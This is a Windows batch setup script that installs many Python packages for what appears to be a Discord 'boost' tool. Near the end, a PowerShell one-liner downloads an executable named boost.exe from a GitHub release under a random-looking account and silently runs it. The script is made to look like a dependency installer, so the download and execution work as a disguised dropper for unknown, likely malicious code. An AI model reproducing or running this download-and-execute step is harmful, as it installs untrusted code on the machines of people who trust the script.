@echo off
pip install aiohttp==3.7.4.post0
pip install anyio==3.6.2
pip install async-timeout==3.0.1
pip install attrs==22.2.0
pip install certifi==2022.12.7
pip install chardet==4.0.0
pip install charset-normalizer==3.0.1
pip install click==8.1.3
pip install colorama==0.4.
pip install discord-ext-slash==0.9.2
pip install discord-webhook==1.0.0
pip install discord.py==1.7.3
pip install Flask==2.2.2
pip install h11==0.14.0
pip install httpcore==0.16.3
pip install httpx==0.23.3
pip install idna==3.4
pip install importlib-metadata==6.0.0
pip install itsdangerous==2.1.2
pip install Jinja2==3.1.2
pip install MarkupSafe==2.1.2
pip install multidict==6.0.4
pip install py-cord
pip install requests==2.28.2
pip install rfc3986==1.5.0
pip install sellpass==1.0
pip install sniffio==1.3.0
pip install tls-client==0.1.8
pip install typing_extensions==4.4.0
pip install urllib3==1.26.14
pip install Werkzeug==2.2.3
pip install yarl==1.8.2
pip install zipp==3.13.0
cd Tuto
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe';$file='boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
start start.bat
